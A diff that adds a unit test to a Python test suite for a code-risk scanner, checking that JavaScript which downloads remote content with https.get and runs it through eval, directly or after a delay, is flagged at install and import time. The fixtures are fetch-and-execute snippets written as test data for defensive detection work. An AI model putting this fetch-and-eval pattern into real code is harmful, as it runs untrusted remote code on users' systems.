@@ -335,6 +335,17 @@ class ReceivedCodeTests(unittest.TestCase):
                 self.assertNotIn(REASON, core.import_time_risk(text)[0])
                 self.assertNotIn(REASON, core.install_script_risk(text))
 
+    def test_on_the_tree_through_a_variable_outside_the_callback(self):
+        # D-15: the response https.get's callback is given, kept in its variable, then put into a variable declared
+        # outside that callback and run. The text detector found it, the tree (which answers for a .js file) did not
+        get = ("const https = require('https');\n%shttps.get(" + U + ", (res) => {\n  let d = '';\n"
+               "  res.on('data', (c) => { d += c; });\n  res.on('end', () => { %s });\n});\n%s")
+        for label, text in (("the module's", get % ("let p;\n", "p = d; eval(p);", "")),
+                            ("run later", get % ("let p;\n", "p = d;", "setTimeout(() => eval(p), 1000);\n"))):
+            with self.subTest(label):
+                self.assertIn(REASON, core.install_script_risk(text, lang="js"))
+                self.assertIn(REASON, core.import_time_risk(text, lang="js")[0])
+
     def test_the_trapdoor_replica_is_an_import_time_risk(self):
         text = RECEIVED[0][1]
         issue = core.dependency_import_issue("site-packages/trapdoor_py/__init__.py", text)
